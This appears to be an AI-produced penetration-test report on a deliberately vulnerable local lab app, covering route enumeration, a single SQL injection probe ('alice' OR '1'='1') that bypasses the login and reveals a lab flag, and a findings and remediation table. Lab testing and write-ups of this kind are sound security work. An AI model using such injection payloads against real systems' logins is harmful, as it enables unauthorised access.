## Security Assessment Report — `http://127.0.0.1:18080`

**Scope:** 127.0.0.1:18080 only (all requests confined to this host/port) · **Mode:** black-box, single benign probe · **Confidence:** high

### 1. Target fingerprint
| Item | Value |
|---|---|
| Server | `BaseHTTP/0.6 Python/3.13.8` (Python `http.server`) |
| App | **VulnCMS** (deliberately vulnerable lab) |

### 2. Enumeration results
| Route | Result |
|---|---|
| `/` | 200 — index, links to `/login`, `/dashboard` |
| `/login` | **200 — login form (GET renders form, POST authenticates)** |
| `/dashboard` | 200 — `<h1>Dashboard</h1><p>Welcome.</p>` (no auth gate observed) |
| `/robots.txt`, `/admin`, `/logout`, `/api`, `/register`, `/static/`, `/nonexistent12345` | 200 — identical 150-byte homepage body (catch-all fallback, **no 404s**) |

**Login endpoint (identified):** `POST http://127.0.0.1:18080/login`, form params `user`, `pass` (urlencoded). Page hint: *"classic SQLi on user field. admin/admin123 if you prefer."*

### 3. SQLi test — one benign probe (read-only tautology, no data modification)

**Baseline** (well-formed input, wrong password):
```
POST /login  user=alice&pass=definitely-wrong
→ HTTP/1.0 401 Unauthorized
  <h1>Login failed</h1><p>Invalid credentials</p>
```

**Probe** (`user` field: `alice' OR '1'='1`, same wrong password):
```
POST /login  user=alice' OR '1'='1&pass=definitely-wrong
→ HTTP/1.0 200 OK
  <h1>Logged in</h1><p>Welcome alice' OR '1'='1</p>
  <p>Flag: FLAG{helmpi_local_lab_ok}</p>
```

### 4. Findings

| # | Finding | Severity | Evidence |
|---|---|---|---|
| F1 | **SQL injection in `user` parameter of `POST /login`** — unparameterized query allows tautology bypass; password field ignored | **Critical (CVSS ~9.8)** | Baseline 401 vs. probe 200 "Logged in"; injected string echoed back unescaped |
| F2 | **Authentication bypass** — arbitrary login with no valid credentials | Critical | Probe authenticated with `pass=definitely-wrong` |
| F3 | **Reflected input / no output encoding** — payload reflected verbatim into HTML | Low (would be XSS-relevant with a real payload; not tested per scope) | `Welcome alice' OR '1'='1` |
| F4 | **Catch-all 200 handler** — unknown paths return homepage instead of 404 | Info | 7 distinct paths → identical 150-byte body |
| F5 | **`/dashboard` reachable without observed auth check** | Medium (needs confirmation; no session cookie was set even after login) | No `Set-Cookie` in any response |

### 5. Coverage limits
- Single benign probe only — no UNION-based extraction, no error-based/time-based testing, no auth bypass chaining into dashboard data, no session analysis (server appears stateless: no `Set-Cookie` returned).
- Route enumeration used a 7-path dictionary, not a full fuzz; catch-all behavior may mask real routes.

### 6. Remediation
1. Parameterized queries (`?` placeholders) — never string-concatenate SQL.
2. Generic auth error messages + constant-time credential comparison; enforce session issuance and server-side auth checks on `/dashboard`.
3. Output-encode all reflected values; return 404 for unknown paths.
